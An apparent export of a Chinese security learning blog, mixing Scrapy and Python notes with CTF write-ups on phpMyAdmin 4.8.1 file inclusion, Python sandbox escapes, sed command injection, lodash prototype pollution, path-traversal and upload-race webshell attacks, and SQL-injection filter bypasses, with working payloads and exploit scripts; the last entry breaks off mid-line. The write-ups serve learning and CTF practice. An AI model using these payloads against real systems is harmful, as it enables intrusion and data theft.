    <content type="text"><![CDATA[scrapy架构 如图 最中间的是scarpy的引擎，引擎指挥Spiders去爬取URL，spiders将requests发往调度器，调度器会针对这些请求进行排队，之后送往dowanloader，downloader会从internet上下载资源，将这些response发往spiders，spiders将其封装好送往item pipeline中 一个spider的工作流程大概就是如上所述 scrapy可以开启一个shell进行调试 123456(base) C:\Users\zz&gt;scrapy shell https://www.anquanke.com2019-08-19 19:18:54 [scrapy.utils.log] INFO: Scrapy 1.7.3 started (bot: scrapybot)2019-08-19 19:18:54 [scrapy.utils.log] INFO: Versions: lxml 4.3.2.0, libxml2 2.9.9, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, Twisted 19.7.0, Python 3.7.3 (default, Mar 27 2019, 17:13:21) [MSC v.1915 64 bit (AMD64)], pyOpenSSL 19.0.0 (OpenSSL 1.1.1b 26 Feb 2019), cryptography 2.6.1, Platform Windows-10-10.0.18362-SP02019-08-19 19:18:54 [scrapy.crawler] INFO: Overridden settings: &#123;&apos;DUPEFILTER_CLASS&apos;: &apos;scra.... 此时会得到一些对象 12345678910111213[s] Available Scrapy objects:[s] scrapy scrapy module (contains scrapy.Request, scrapy.Selector, etc)[s] crawler &lt;scrapy.crawler.Crawler object at 0x00000269894A07B8&gt;[s] item &#123;&#125;[s] request &lt;GET https://www.anquanke.com&gt;[s] response &lt;200 https://www.anquanke.com&gt;[s] settings &lt;scrapy.settings.Settings object at 0x00000269894A0AC8&gt;[s] spider &lt;DefaultSpider &apos;default&apos; at 0x269897d5160&gt;[s] Useful shortcuts:[s] fetch(url[, redirect=True]) Fetch URL and update local objects (by default, redirects are followed)[s] fetch(req) Fetch a scrapy.Request and update local objects[s] shelp() Shell help (print this help)[s] view(response) View response in a browser 此时可以针对我们的xpath进行调试 xpath如何获得？我们可以自己手动编写，或者直接通过chrome的开发者工具获得 然后尝试一下对不对 12345In [2]: response.xpath(&apos;//*[@id=&quot;post-list&quot;]/div[1]/div[2]/div[2]/div/div[1]/a&apos;)Out[2]: [&lt;Selector xpath=&apos;//*[@id=&quot;post-list&quot;]/div[1]/div[2]/div[2]/div/div[1]/a&apos; data=&apos;&lt;a target=&quot;_blank&quot; rel=&quot;noopener nore...&apos;&gt;]In [3]: response.xpath(&apos;//*[@id=&quot;post-list&quot;]/div[1]/div[2]/div[2]/div/div[1]/a/text()&apos;).extract()Out[3]: [&apos; 正在直播 | ISC 2019 互联网安全大会&apos;] 这样就能爬取下来了 一个简单的爬虫 我们看一下官方提供的一个栗子 目录结构如下： 在items.py文件中： 12345678from scrapy.item import Item, Fieldclass Website(Item): name = Field() description = Field() url = Field() 这里定义了我们需要爬取的items，稍后我们将在我们的spider中编写xpath规则来提取我们需要的数据 在dmoz.py中(爬虫的名字叫dmoz，名字必须唯一) 1234567891011121314151617181920212223242526272829303132333435363738from scrapy.spiders import Spiderfrom scrapy.selector import Selectorfrom dirbot.items import Website # ---&gt; 导入了我们之前定义的itemsclass DmozSpider(Spider): name = "dmoz" allowed_domains = ["dmoz.org"] start_urls = [ "http://www.dmoz.org/Computers/Programming/Languages/Python/Books/", "http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/", ] def parse(self, response): # spider默认的回调函数 """ The lines below is a spider contract. For more info see: http://doc.scrapy.org/en/latest/topics/contracts.html @url http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/ @scrapes name """ sites = response.css('#site-list-content &gt; div.site-item &gt; div.title-and-desc') items = []'''解析数据''' for site in sites: item = Website() item['name'] = site.css( 'a &gt; div.site-title::text').extract_first().strip() item['url'] = site.xpath( 'a/@href').extract_first().strip() item['description'] = site.css( 'div.site-descr::text').extract_first().strip() items.append(item) return items 可以看到这就是一个简单的，可以运行的爬虫了 当然还有后续的步骤，包括如何爬取更多的数据，如何换页，如何将数据存入数据库中等等 参考 xpath学习]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin远程文件包含漏洞]]></title>
    <url>%2F2019%2F08%2F19%2Fphpmyadmin%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上 这个本地文件包含的漏洞确实挺巧妙地，分析一下： 漏洞利用分析 在GitHub上找了一下phpmyadmin的源码，不过话说我还不知带phpmyadmin怎么安装，之后研究一下 index.php 看到这串代码if判断很多，主要是最后一个判断 123456789if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target'])) &#123; include $_REQUEST['target']; exit;&#125; 注意preg_match('/^index/', $_REQUEST['target'])是判断是不是以index开头，如果是就返回true，但是由于!所以就不能以index开头，类似这种判断不要被绕晕了 Core::checkPageValidity检查，问题就出在这，方法定义在443行 黑名单如下 123$target_blacklist = array ( 'import.php', 'export.php'); 方法具体如下： 123456789101112131415161718192021222324252627282930public static function checkPageValidity(&amp;$page, array $whitelist = [])&#123; if (empty($whitelist)) &#123; $whitelist = self::$goto_whitelist; &#125; if (! isset($page) || !is_string($page)) &#123; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; return false;&#125; 如果我们两个词URL编码。即%253f 浏览器传送之后变成%3f此时前两次if都不会进去，最后一次先urldecode，那么就变成了? 这时候是可以绕过的。 之所以要两次编码，直接用一个&quot;?&quot;不也可以绕过吗。 会导致这样的问题不能包含成功，具体为什么我也不是很清楚 hctf2018 这篇文章已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE 题目源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; 题目要绕过不算难，但是有一个地方很重要 这是我在本地调试的目录： 调试的时候我使用了如下payload http://localhost/audit/warmup.php?file=source.php%253f/../flag.php 此时能够成功绕过 就在这种情况下，文件包含也是成功的！ 根据题目提示flag在某个位置，其实这里靠猜了，因为只能用../这样的来回到上一级目录 参考 phpmyadmin4.8.1远程文件包含漏洞 phpmyadmin4.8.1后台getshell phpMyAdmin 4.8.x 本地文件包含漏洞利用 突然还发现一个可以复现很多漏洞的地方 https://www.vulnspy.com/phpmyadmin-4.8.1/ github地址： https://github.com/vulnspy/phpmyadmin-4.8.1]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>LFI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redpwnctf复盘]]></title>
    <url>%2F2019%2F08%2F19%2Fredpwnctf%E5%A4%8D%E7%9B%98%2F</url>
    <content type="text"><![CDATA[MISC he sed shi sed 一道很有意思的题目，看了一下源码如下： 12345678910from os import systeminp = input("What you thought you sed\n")rep = '/' + input("What you aren't sure you sed\n") + '/' new = input("What you actually sed\n")cmd = 's' + rep + new + "/g"if "'" not in new: cmd += "'"print("You actually said")system("echo '" + inp + "' | sed '" + cmd) sed命令是一种文本处理的命令， sed s/a/b/g 就是替换 如果我们输入： 12345678What you thought you sedabcdefWhat you aren&apos;t sure you sedbWhat you actually sedcYou actually saidaccdef 可以据此猜测出就是将b替换成了c 于是猜测命令如下： echo $1 | sed 's/$2/$3/g' 注意到这两种命令的区别 于是输入$(ls) 得到的结果如下： 然后尝试输入'$(ls)' 这个时候就得到结果了，实现了命令注入 genericpyjail 题目给了一个黑名单，并且提示你黑名单是不安全的，也就是要绕过了。 很多都被禁止了，那么如何才能够绕过这些限制来达到任意命令执行呢 这里可以使用unicode编码来绕过限制hhh（没想到吧 或者这样也行： payload: 123456&apos;\u0066\u003d\u006f\u0070\u0065\u006e\u0028\u0022\u0066\u006c\u0061\u0067\u002e\u0074\u0078\u0074\u0022\u002c\u0020\u0022\u0072\u0022\u0029&apos;.decode(&apos;unicode-escape&apos;)&apos;\u0070\u0072\u0069\u006e\u0074\u0028\u0066\u002e\u0072\u0065\u0061\u0064\u0028\u0029\u0029&apos;.decode(&apos;unicode-escape&apos;)or--exit(getattr(locals().get(chr(95)*2+&apos;built&apos;+&apos;ins&apos;+chr(95)*2), &apos;op&apos;+&apos;en&apos;)(&apos;fl&apos;+&apos;ag.txt&apos;).read()) 留下一个问题，怎么将字符转为Unicode编码。。 Tux Trivia Show 一个师傅的exp 123456789101112131415161718192021222324from pwn import *from subprocess import check_outputp = remote("chall.2019.redpwn.net", 6001)p.recvuntil("!!!")while True: try: print(p.recv()) s = p.recvuntil('?') except EOFError: s = p.recv() print(s) print(s) s = s[:-1] s = s.split('capital of ')[1] # print(s) ans = check_output(['python3', 'get_capital.py', s]) print(ans) p.sendline(ans)p.interactive() get_capital.py如下： 12345678910111213141516171819202122232425262728from countryinfo import CountryInfoimport syscountry = sys.argv[1]country_obj = CountryInfo(country)caps = &#123;'New Mexico': 'Santa Fe', 'Colorado': 'Denver', 'Vermont': 'Montpelier', 'Arizona': 'Phoenix', 'Iowa': 'Des Moines', 'Florida': 'Tallahassee', 'West Virginia': 'Charleston', 'Illinois': 'Springfield', 'Oregon': 'Salem', 'Kansas': 'Topeka', 'Arkansas': 'Little Rock', 'Kentucky': 'Frankfort', 'Massachusetts': 'Boston', 'Texas': 'Austin', 'Wyoming': 'Cheyenne', 'Maryland': 'Annapolis', 'New York': 'Albany', 'New Jersey': 'Trenton', 'Louisiana': 'Baton Rouge', 'South Carolina': 'Columbia', 'Georgia': 'Atlanta', 'Idaho': 'Boise', 'Alaska': 'Juneau', 'Oklahoma': 'Oklahoma City', 'Connecticut': 'Hartford', 'Nebraska': 'Lincoln', 'Tennessee': 'Nashville', 'Pennsylvania': 'Harrisburg', 'Michigan': 'Lansing', 'Maine': 'Augusta', 'Wisconsin': 'Madison', 'South Dakota': 'Pierre', 'California': 'Sacramento', 'New Hampshire': 'Concord', 'Indiana': 'Indianapolis', 'Washington': 'Olympia', 'Utah': 'Salt Lake City', 'Alabama': 'Montgomery', 'Minnesota': 'St. Paul', 'Hawaii': 'Honolulu', 'Ohio': 'Columbus', 'Missouri': 'Jefferson City', 'Delaware': 'Dover', 'Virginia': 'Richmond', 'Nevada': 'Carson City', 'Montana': 'Helena', 'North Dakota': 'Bismarck', 'Mississippi': 'Jackson', 'North Carolina': 'Raleigh', 'Rhode Island': 'Providence', 'Bahamas': 'Nassau', 'Andorra': 'Andorra la Vella', 'East Timor (Timor-Leste)': 'Dili', 'Serbia': 'Belgrade', 'Macedonia': 'Skopje', 'Gambia': 'Banjul'&#125;# with open('usstates.csv', 'r') as f:# for l in f:# l = l.strip()# state, cap = l.split(',')# caps[state] = captry: if country == 'Georgia': print(caps['Georgia']) elif country == 'San Marino': print('San Marino') elif country == 'Kiribati': print('Tarawa') elif country == 'Moldova': print('Chisinau') else: print(country_obj.capital())except KeyError: print(caps[country]) genericpyjail2 还是一道python沙盒逃逸的题目 源码 1234567891011121314gone = ['open','file','execfile','compile','reload','__import__','eval','input']for func in gone: del __builtins__.__dict__[func]print 'wow! again, there\'s a file called flag.txt! insane!'while True: try: x = raw_input() if " " in x: print "no spaces!" exit() print "now it's ", x, "!" exec 'x=' + x except Exception, e: print 'Exception: ', e 给出的payload如下 raw_input((42).__class__.__base__.__subclasses__()[40]('flag.txt').read()) web blueprint 题目给出了源码 但是这对于不懂JavaScript的我来说又有什么用呢。 天真的以为是XSS，于是抓包fuzz了一波，但是没有任何结果： 之后得知这是JavaScript原型污染，具体什么是JavaScript的原型污染之后再说 可以参考这篇，lodash这个库存在原型链污染 poc如下 1234567891011const mergeFn = require('lodash').defaultsDeep;const payload = '&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'function check() &#123; mergeFn(&#123;&#125;, JSON.parse(payload)); if ((&#123;&#125;)[`a0`] === true) &#123; console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`); &#125; &#125;check(); 原体中存在漏洞的代码； exp 12345678import requestsuser_id = '22b0d010672600233e4ea68da64b1750'url = "http://39.106.125.244:8001/"r = requests.post(url, cookies=&#123;"user_id":user_id&#125;, json=&#123;"content":"yakuhito was here","public":true, "constructor": &#123;"prototype": &#123;"public": true&#125;&#125;&#125;)print(r.text) 然后就可以看到flag了 关于JavaScript原型链污染的文章可以看p牛的 参考 Redpwn CTF 2019 – Writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>MISC</tag>
        <tag>web</tag>
        <tag>redpwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MISC中的隐写]]></title>
    <url>%2F2019%2F08%2F19%2FMISC%E4%B8%AD%E7%9A%84%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[bugkuctf——猫片 一张猫的图片，题目有三个提示LSB BGR NTFS 于是用StegSolver去提取数据 看到了PNG的文件头 保存下来在Winhex中打开 修复好图片，然后用微信扫描，（虽然这张图片是颜色反转的，但是新版的微信也能扫出来） 得到一个rar压缩文件，用winrar解压报错，于是机智的我用7z解压，然而。。。 只好去找师傅们的wp，说是NTFS隐写，给了个工具 这时候就有点坑爹了，用7z解压缩的找不到，必须得用winrar解压缩的才行 得到pyc文件之后需要去这个网站反编译成python代码 得到python代码： 12345678910111213141516171819202122232425262728293031323334353637383940import base64def encode(): flag = '*************' ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) return ciphertext[::-1]ciphertext = [ '96', '65', '93', '123', '91', '97', '22', '93', '70', '102', '94', '132', '46', '112', '64', '97', '88', '80', '82', '137', '90', '109', '99', '112'] 我的解密脚本 1234567891011121314# 解码def decode(): res = [] ciphertextTemp = ciphertext[::-1] for i in range(len(ciphertext)): s = ciphertextTemp[i] if i % 2 == 0: s = chr(int(s)-10) else: s = chr(int(s)+10) res.append(chr(int(str(ord(s)^i)))) return ''.join(x for x in res)print(decode()) whuctf--taxi.png 这个题目当时使用matlab提取出来的，不过后来才知道用stegsolver也行 只需要打开之后浏览不同的通道即可 解密网站 此时我们简要分析一下StegSolver是如何提取数据的 给出代码： 123456789101112131415161718192021222324252627from PIL import Imageim = Image.open("LSB.bmp")pix = im.load()width, height = im.sizeextract_bits = []for y in range(height): for x in range(width): # 每次取出一个像素点 r,g,b = pix[(x, y)] extract_bits.append(r &amp; 1) extract_bits.append(g &amp; 1) extract_bits.append(b &amp; 1)# 然后每8位一组extract_byte_bits = [extract_bits[i:i+8] for i in range(0, len(extract_bits), 8)]with open("extracted2.bmp", "wb") as f: for per_byte in extract_byte_bits: byte_str = ''.join(str(x) for x in per_byte) # 将list中的元素拼接起来 byteStr = chr(int(byte_str, 2)) f.write(bytes(byteStr, encoding='utf-8')) 这个是参考先知某位师傅后修改的，适用于python3 可以帮助理解如何提取，从代码中可以看出，此处是先确定某一处高度，然后依次将宽度上的像素点提取出来，也就是StegSolver中的Extracted by Row,并且此处是按照该rgb的顺序来的 大概思考了一下如果要把信息隐藏到图片中，这样应该可以: 123456789101112131415161718192021222324252627282930from PIL import Imageim = Image.open("LSB.bmp")pix = im.load()width,height = im.sizeflag = "flag&#123;Ilovyou&#125;"# 取出flag中的每一位，编码成2进制的8位，3位3位的选出来# 依次与r,g,b去与# insert_bits = []for i in range(len(flag)): byte = bin(ord(flag[i]))[2:].zfill(8) insert_bits.append(byte[x] for x in range(len(byte)))# 化成3位一组# insert_bits_per_3 = [insert_bits[i:i+3] for i in range(0, len(insert_bits), 3)]for y in range(height): for x in range(width): r,g,b = pix[(x,y)] ... 但是我不知道怎么把数据写回图片。。。未完待续好了 实验吧一道题 这样一张bmp格式的图片 解法就是通过Windows的画图工具另存为png格式的，然后用StrgSolver浏览就行 问鼎杯保密技能大赛 得到这样一张图片， ![]https://raw.githubusercontent.com/xinyongpeng/gitpic/master/misc4.png 首先需要修复png格式，其次需要修改宽度，但是需要考虑到crc32校验码 123456789101112131415import osimport binasciiimport structmisc = open("misc4.png","rb").read()# i = 0# a = struct.pack('&gt;i', i)for i in range(1024): data = misc[12:16] + struct.pack('&gt;i',i)+ misc[20:29] crc32 = binascii.crc32(data) &amp; 0xffffffff if crc32 == 0x932f8a6b: print(i) 第一个数据块总共就是13位长，struct.pack('&gt;i',i)依次尝试每一个宽度 不过为啥要与0xffffffff进行与运算就很神奇 参考PNG 参考 Lsb图片隐写 github上一个LSB项目]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>MISC</tag>
        <tag>隐写</tag>
        <tag>LSB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MISC中神奇的编码]]></title>
    <url>%2F2019%2F08%2F18%2FMISC%E4%B8%AD%E7%A5%9E%E5%A5%87%E7%9A%84%E7%BC%96%E7%A0%81%2F</url>
    <content type="text"><![CDATA[社会主义核心价值观编码 https://sym233.github.io/core-values-encoder/ Quoted-Printable编码 http://www.mxcz.net/tools/quotedprintable.aspx ... 1234567891011121314151617181920..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!........ ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?...... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!!!!?.? !.?!! !!!!! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!! !!?.? !.?!!!!!!! !!!!! !!!!! !!!!! !.!!! !!!!! !!!!! .?... ..... ..... ..!?! !.?....... ..... ..?.? !.?.. ..!.? ..... ..... ...!? !!.?! !!!!! !!!!! !?.?!.?!!! !!!!! !!!!! !!!!! !!!.? ..... ..... ...!? !!.?. ..... ..... .?.?!.?... ..... ..... ...!. ..!.! !!!!. ?.... ..... ..... .!?!! .?!!! !!!!!!!!!! !?.?! .?!!! !!!!. ..... ..... ..!.! !!.!! !.!!! .!!!! !!!.. .......... ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .......... .!.?. ..... ..... ..!?! !.?!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!!!!!!!!! !!.!! !!!.! !!!!! !!!.? ..... ..!?! !.?.. ....? .?!.? ..... .!.?...... ..... ..!?! !.?.. ..... ..... ?.?!. ?.... ..... ..... ....! .!!!.!!!!! !!.?. ..... ..... ....! ?!!.? !!!!! !!!!! !!!!? .?!.? !!!!! !!!!...... ...!. ..... ..... ..!.! !!... ..!.? ..... ..... ...!? !!.?. .......... .?.?! .?... ..... ..!.? ..... ..... ...!? !!.?! !!!!! !!!!! !?.?!.?!!! !!!!! !!!!! !!.!! !.?.. ..... ..... .!?!! .?... ..... ....? .?!.?..... ..... ..... .!.?. ..... ..... ..!?! !.?!! !!!!! !!!!! ?.?!. ?!!!!!!!!! !!!!! !!!!! !!.!. ?.... ..... ..... .!?!! .?... ..... ..... .?.?!.?!.! !!!!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?. ...!. ?. 参考 bugku ctf 一段base64 wirteup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python中的编码问题]]></title>
    <url>%2F2019%2F08%2F18%2Fpython%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[似乎好久之前就对这个有疑问了，还是沉下心来好好理解一下 python3中的字符串都是Unicode编码的，我们知道编码是有很多种方式的，最常见的有utf-8,gbk,ascii编码 好我们先来看： 12a = 'example' ---&gt; a 是 str类型b = a.encode('utf-8') ---&gt; 编码为字符 此时b的值为： b'example' 那这就很奇怪了，明明字母e德utf-8编码是0x65,为什么这里还是原来的？？ 不妨看这个： 我们看到python默认会将这个解释成对应的字符，那这就很没办法了 但是请看这个： 当我们去取出b中的一个元素时，这时候又转成了字母e的utf-8编码，只能说python在这一点上确实做的我无法理解 ok到这里大概疑惑就没了，用什么格式编码得到的byte，就需要用对应的格式解码回去 可以看出不同的编码得到的byte是不一样的，并且python默认会将可打印的字符直接打印出来？ 问题 十六进制 12345a = 'example'b = b'example'res = ''for i in b: res += str(hex(i))[2:] 此时res的值为：6578616d706c65 如果要将其变回原来的字符串怎么办 也就是一种ASCII hex编码 bytes.fromhex(res)这样就行了]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>str</tag>
        <tag>byte</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全专项赛]]></title>
    <url>%2F2019%2F08%2F17%2F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A1%B9%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[跟队友打了一下这个比赛，小白学习了很多知识 show_me_your_image 这道题目很晕，上传文件之后可以查看，URL中的name似乎可以进行任意文件读取，但是base64解码之后得到的结果却是乱码，同时session可以用之前flask解码的脚本解码，但是这明明是php？？？(后来才知道是伪装成了php的flask) 首先还是需要学习一下python中的requests包，如何使用requests包上传文件 requests上传文件的简要代码如下： 1234567891011# coding=utf-8import requestsurl = "http://localhost:6789/upload"file = open("1.jpg", 'rb')files = &#123;'file': ('new_name.jpg', file, 'image/pjpeg')&#125;response = requests.post(url, files=files)file.close()print response.status_codeprint response.request.headersprint response.request.body files中包含了file对应的文件名，文件内容，和类型，有这三者就够了 参考师傅们的exp 123456789101112131415161718192021222324252627282930313233343536373839404142import urllibimport base64import requestsfrom bs4 import BeautifulSoupdef base_encode(target, filename): if len(filename) != 3: return None r = requests.post(target+"upload.php", files=&#123;'file': (filename + '.jpg', 'z3r0test', 'text/plain')&#125; ) # print(r.text) soup = BeautifulSoup(r.text, "html.parser") pic_url = soup.find('img') # print(pic_url['src'].replace('img.php?name=', '')) filename = pic_url['src'].replace('img.php?name=', '') # print(filename) urldecode = urllib.parse.unquote(filename) return urldecode[:4]def read(target, filename): filename = urllib.parse.unquote(filename) r = requests.get(target+"img.php", params=&#123;'name': filename&#125;) print(r.text)if __name__ == "__main__": target = "http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/" payload = "../.././proc/self/root/root/flag.txt" # payload = "../..//proc/self/cwd/app.py" if len(payload) % 3 != 0: print("must be three times!") exit() final = "" for i in range(0, len(payload), 3): final += base_encode(target, payload[i:i + 3]) final = urllib.parse.quote(final) read(target, final) 两个trick： fuzz出文件名的编码关系，这里是三个变四个 /proc/self/cwd/ 指向的是当前路径，在本题中用于拼凑3倍数长度的字符串 其实我们只需要上传文件名然后获得对应的编码就行r = requests.post(target+&quot;upload.php&quot;,files={'file': (filename + '.jpg', 'z3r0test', 'text/plain')}) 之后调用BeautifulSoup去解析就行了 参考 使用requests 上传文件]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>MISC</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[上传竞争]]></title>
    <url>%2F2019%2F08%2F17%2F%E4%B8%8A%E4%BC%A0%E7%AB%9E%E4%BA%89%2F</url>
    <content type="text"><![CDATA[文件上传的题目遇到的不是很多，这里分析一下文件上传竞争 上传竞争的来源： 栗子：先存储文件，再判断是否合法，然后再删除。 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室” 攻击：首先上传一个php文件 当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。 这里有一道对于文件上传竞争的wp： 2018护网杯第一场 web easy tornado LTshop超详细解答 同时我们来看一下moctf的一道题: http://119.23.73.3:5006/web2/index2.php 直接访问index2.php肯定不正常，抓包修改成index.php，提示uploadsomething.php 访问之后是一个文件上传页面。自定义文件名和文件内容 文件名可以是php后缀的，那思路就是写一个shell进去再访问，但是访问时候页面提示太慢了。 所以题目可能是检测到了php代码将其删除了，于是考虑文件上传竞争 抓两个包，一个是文件上传的 /web2/uploadsomething.php?filename=1.php&amp;content=%3C%3Fphp%2Bsystem%28%E2%80%9Cls%E2%80%9D%29%3B%3F%3E 另一个是访问的 /web2/uploads/56db0b8d99fd6116ed67d35b607cd9351ea94156/1.php 都发送到intruder模块，设置线程为50，字典为空 先爆破第一个： 然后爆破第二个： 就会有flag了 参考 CTF中的条件竞争漏洞]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复习git]]></title>
    <url>%2F2019%2F08%2F16%2F%E5%A4%8D%E4%B9%A0git%2F</url>
    <content type="text"><![CDATA[最近发现自己还不是很懂git，于是好好学习一下 git标签管理 git有一个打标签的功能，这个功能可以理解成虚拟机的快照， Git的标签虽然是版本库的快照，但其实它就是指向某个commit的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。 ---摘自廖雪峰 命令git tag &lt;tagname&gt;用于新建一个标签，默认为HEAD，也可以指定一个commit id； 命令git tag -a &lt;tagname&gt; -m &quot;blablabla...&quot;可以指定标签信息； 命令git tag可以查看所有标签。 命令git push origin &lt;tagname&gt;可以推送一个本地标签； 命令git push origin --tags可以推送全部未推送过的本地标签； 命令git tag -d &lt;tagname&gt;可以删除一个本地标签； 命令git push origin :refs/tags/&lt;tagname&gt;可以删除一个远程标签。 GitHack的原理 如果将.git文件夹部署到线上环境，将引起git源码泄露 工作原理： 1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 ) 2、去.git/objects/ 文件夹下下载对应的文件 3、zlib解压文件，按原始的目录结构写入源代码 git的原理 git cat-file 命令 参考 GitHack：一个git泄露利用脚本 git内部原理 XDCTF2015代码审计全解]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JarvisOJ]]></title>
    <url>%2F2019%2F08%2F16%2FJarvisOJ%2F</url>
    <content type="text"><![CDATA[神盾局的秘密 查看页面源码，猜测是本地文件包含 先查看showimg.php 123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; 然后查看index.php 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 再查看shield.php 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 尝试直接查看pctf.php没有成功 123456class Shield&#123; public $file='pctf.php';&#125;$a= new Shield();echo serialize($a); IN a mess 源代码提示访问 index.phps 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 这个审计题目是见过的 精心构造的payload 用0a绕过弱类型，用伪协议绕过文件读取，用%001111绕过substr和strlen 之后来到第二关： 发现是注入 过滤了空格和一些关键字符，可以使用双写绕过 之后尝试爆字段 字段数为3 GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,3%23 HTTP/1.1 数据库名： 其实表是已经知道了，就是content，不过还是再手动爆一下： 这里必须使用十六进制编码，不然得不到 爆字段 GET 